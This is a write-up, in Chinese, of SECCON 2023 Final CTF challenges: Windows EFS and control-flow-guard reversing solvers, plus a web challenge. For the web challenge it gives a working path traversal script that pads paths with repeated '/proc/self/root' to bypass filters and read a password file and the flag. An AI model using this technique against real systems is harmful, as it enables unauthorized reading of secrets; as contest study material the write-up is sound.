---
title: '2023 SECCON CTF Final Write-Up'
author: "TwinkleStar03"
tags: [Japan, SECCON CTF Final, Write-Up, '${CyStick}']
categories: [Write-Up]
date: 2024-01-04
description: 前往日本參加 SECCON CTF Final 的 Write-Up
toc: true
---

## 前言
這是我在日本參加 SECCON 2023 Final 的詳細 Write-Up 文章。
本篇文章只有著墨於我有較多參與的題目，其他只有沾到點邊的題目我就沒特別寫在文章內了。

我會另外寫一篇本次競賽之旅的遊記，如果有興趣可以關注接下來的文章更新喔！

## Day1
### Reverse - efsbk
在第一天首殺一題 Reverse `efsbk`，基於 Windows Encrypt FileSystem 的題目。

整個解題過程其實蠻順利的，如果跟另一題目 `call` 比起來的話。第一時間發現其實 binary 沒什麼要拆的，最難的其實是跟 Windows FS Encryption 相關的。

大致整理了一下遇到題目時的想法： 
- Decryption Key 是什麼、會是什麼格式
- 應該怎麼 Import/Export 讓 FileSystem 將此檔案認定處於加密狀態

嘗試解決這些第一時間遇到的想法我認為對於解題是相當重要的。第一，會發現他是 PrivateKey + Certificate 的組合，然後用 PKCS#12 保存（如果 Windows 正常 Export 都長這樣；Import/Export 就比較特別了，如果單純的把檔案內容寫上去，檔案並不會是 encrypted state，就只會是個普通的文字檔案，必須要通過 WinAPI 來協助我們做 Import（其實就只是把題目的 Code 反著做一次），做完之後檔案就會在檔案系統上處於 Encrypted state。

將檔案以加密狀態寫入 FileSystem 的方法：
```cpp
DWORD PfeImportFunc1(
	PBYTE pbData,
	PVOID pvCallbackContext,
	PULONG ulLength
) {
    if (remain_bytes > 0) {
        *ulLength = remain_bytes;
        memcpy(pbData, buffer, (size_t)remain_bytes);
        remain_bytes = 0;
        printf("Done write\n");
        return 0;
    }
    *ulLength = 0;
    printf("Done write\n");
    return 0;
}

int main()
{
	PVOID ctx;
	DWORD ret = OpenEncryptedFileRawA("flag_z.txt", 1, &ctx);
    Sleep(1000);

	if (ret != 0) {
        DWORD lasterr = GetLastError();
        printf("Failed to OpenEncryptedFileRaw %d\n", lasterr);
	}

	h_file = CreateFileA("./encrypted_flag.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (h_file == INVALID_HANDLE_VALUE) {
        DWORD lasterr = GetLastError();
        printf("Failed to open or create file, %d\n", lasterr);
        return 1;
    }

    // Read file content
    BOOL readResult = ReadFile(h_file, buffer, sizeof(buffer), &remain_bytes, NULL);
    if (!readResult) {
        printf("Failed to read file\n");
        CloseHandle(h_file);
        return 1;
    }
    
    printf("Done reading, now restore backups\n");
    printf("Read %d bytes", remain_bytes);

	WriteEncryptedFileRaw(PfeImportFunc1, 0, ctx);
    CloseEncryptedFileRaw(ctx);
    CloseHandle(h_file);
    return 0;
}


```

做完這點之後比較難的反而是怎麼將 Key 用於解密上，因為他會有 User Attribute 然後又是被鎖起來的，這點我到最後都還是沒有解決，最後則是靠著 `Disk EFS Recovery Tool` 的試用版解掉的（通過試用版的功能幫我做解密，因為他可以避開檔案權限直接對硬碟存取並用我給他的 PFX 去解密檔案）。


### Reverse - call
大半夜解了另一題 Reverse 題目 `Call`，這題算是讓我認識的 MSVC Runtime 的 Initialization 過程，也認識了 CRT 相關的 table 跟 IO Block structure (某種 FILE) 結構。
但這些都不是這題的重點，我原先以為這題目是一個要動態跑起來才會有資訊的碗糕，結果到最後才發先根本不需要。

在撞牆的過程中有把一些 indicatation 問朋友，獲得了一些猜想：像是要修好 PE Header, IAT 等等，結果最後發現就算 IAT 修好也不夠，有更多 CRT 相關的函數跟結構需要做 Patch。
其中我發現了一個最重要的點是 `_guard_check_icall_fptr` 這個東西會指向一個協助做 CET Check 用的 Function，而這個 function 會去查詢一張 Guarded funciton list，只有在這個表裡面的函數才可以通過 guard check。

而這題目就是在 guard check 上面做出了 flag checker，只要將邏輯捋清楚後 solver script 就是五分鐘的事情了。
題目 check 邏輯就是把 flag 每一個 char 跟 index 的 bit 排好，然後對 0xc 個 bit 做 hash，然後會跳去某個函數上面，因為跳轉上會需要通過 guard check 所以只要 hash 生成後的 function 不是 guard page 上的東西就會 fail。

`solver.py`
```python
import struct
from string import ascii_letters, digits, punctuation


CHARSET = ascii_letters + digits + punctuation

def lshr(x, n):
    return x >> n if x >= 0 else (x + 0x100000000) >> n

def emulate(flag, check_fn) -> bool:
    for idx, c in enumerate(flag):
        p1 = 0
        p2 = 0
        factor = 1
        bitvec = idx | (32* ord(c))
        print(f'bitvec = {hex(bitvec)}')
        for round in range(0xc):
            v5 = 0x1020 + (32 * (bitvec & 1) + 32 * p1 + 32 * p2 + 16)
            print(f'[*] Offset of {c}[{round}] @ {hex(idx)}', hex(v5))

            if not check_fn(v5):
                return False

            p1 *= 2
            p1 += 2 * (bitvec & 1)
            bitvec >>= 1

            factor *= 2
            p2 += factor
        
    return True

def main():
    n_entries = (0x85dfd - 0x72b64 + 1) // 5
    entries = []
    with open('./call.exe.dmp', 'rb') as fp:
        fp.seek(0x72b64)

        for _ in range(n_entries):
            raw_data = fp.read(5)[:-1]
            entries.append(struct.unpack('<I', raw_data)[0])

    print(f'[+] Successfully dumped offsets ({n_entries})')

    found = ''
    for idx in range(0x20):
        for char in CHARSET:
            in_progress = found + char
            if not emulate(in_progress, lambda x: True if x in entries else False):
                continue

            print(f'[+] Found byte @ {idx} = {char}')
            found += char
            break
    
    if len(found) != 0x20:
        print('Fucked')
        return
    
    print(f'SECCON{{{found}}}')
    
main()
```

## Day2
### Reverse - okihai
嘗試解一題被 pkg 包裝過的 Reverse 題 `okihai`，我先通過 pkg unpacker 拿到所有 asset 跟被 v8 Compile 過的 bytecode，其實這題沒有在賽中解掉是非常可惜的，賽後跟有解開的隊伍討論的時候才發現其實我只差一步就做完ㄌ Q_Q

這題最麻煩的就是把 v8 Compile 過的 Bytecode disassemble，但我到最後都沒能成功 Patch v8 讓它噴出 bytecode disassembly... 最後才發現其實有一篇文章 [Blitz-2024 Registration](https://github.com/JesseEmond/blitz-2024-registration) 有一步一步教學怎麼 Disassemble V8 Bytecode，真不知道有解開的隊伍是怎麼查到這篇文章的，當時怎麼查都查不到... 資料查找與收集也是決定勝敗的關鍵之一啊...

這題最後只有兩隊還三隊解掉，分數是相當高的，如果能夠解掉也許排名會有所改變也說不定。

這題目的邏輯是有 100 把 Key 跟 IV，對 Flag 做 AES CBC Encryption，然後最後會有一串 Magic String 對內容做 XOR。我有通靈出前面一半，但最後因為沒有 Disassembly 所以也沒辦法知道 Magic String 長啥樣，真的好可惜...

### Web - PlainBlog
一題 Path Traversal 的題目，有兩個關卡 （`premium`, `index`）要過，都是通過 Path Traversal 完成。隊友 @maple3142 在最一開始把第二關（`premium`）解掉之後第一關卡住不知道該怎麼處理，這題就被擱置了。
我放棄 `okihai` 之後就轉向看這題被擱置的題目。

`app.py`
```python
@app.route('/', methods=['GET', 'POST'])
def index():
    page = get_params(request).get('page', 'index')

    path = os.path.join(PAGE_DIR, page) + '.txt'
    if os.path.isabs(path) or not within_directory(path, PAGE_DIR):
        return 'Invalid path'

    path = os.path.normpath(path)
    text = read_file(path)
    text = re.sub(r'SECCON\{.*?\}', '[[FLAG]]', text)

    if contains_word(path, PASSWORD):
        return 'Do not leak my password!'

    return Response(text, mimetype='text/plain')

@app.route('/premium', methods=['GET', 'POST'])
def premium():
    password = get_params(request).get('password')
    if password != PASSWORD:
        return 'Invalid password'

    page = get_params(request).get('page', 'index')
    path = os.path.abspath(os.path.join(PAGE_DIR, page) + '.txt')

    if contains_word(path, 'SECCON'):
        return 'Do not leak flag!'

    path = os.path.realpath(path)
    content = read_file(path)
    return render_template_string(read_file('premium.html'), path=path, content=content)
```

總之 `contains_word` 跟 `within_directory` 與 `os.path` 上有邏輯差異，所以可以做 Path Traversal。
`util.py`:
```python
def resolve_dots(path):
    parts = path.split('/')
    results = []
    for part in parts:
        if part == '.':
            continue
        elif part == '..' and len(results) > 0 and results[-1] != '..':
            results.pop()
            continue
        results.append(part)
    return '/'.join(results)

def within_directory(path, directory):
    path = resolve_dots(path)
    return path.startswith(directory + '/')

def read_file(path):
    with open(os.path.abspath(path), 'r') as f:
        return f.read()

def contains_word(path, word):
    return os.path.exists(path) and word in read_file(path)

```

`premium` 可以通過讓 Path 長度超過一定數量後讓 `os.path.exists(path)` 壞掉，進而 Shortcut 整個 `contains_word` 的邏輯。所以就可以讓第二關彈出 Flag 不會被擋住。

`index` 則是要想辦法讓 `password` 可以被寫出來，我則是通靈出來一個規則可以無限加長 Path 進而像原本的作法一樣可以 Shortcut `contains_word` 的邏輯。

最後的 Solve Script:

```python
import requests


# Stage 1
what = '//////////../../../../../../../'
r = requests.post(
    "http://plain-blog.int.seccon.games:3000",
    data={
        "page": "./////////////../../../../../../../../../..////////////////////../../../../../../../../../../../../../../../../../../../../..//////////////../../../../../../../../../../../////////////../../../../../../../../../" + what * 1000 + '/proc/self/root/' * 19
         + "/proc/self/cwd/password",
    },
)
print(r.text) # PASSWORD_1daf3acb1033d8924952f0e854dc5871d723a36cb56e711b274c743900b31287

# Stage 2
r = requests.post(
    "http://plain-blog.int.seccon.games:3000/premium",
    data={
        "password": r.text,
        "page": ".////////////////////////../../../../../../.."
        + "/proc/self/root" * 50 + "/proc/self/cwd/flag",
    },
)
print(r.text) # FLAG
```
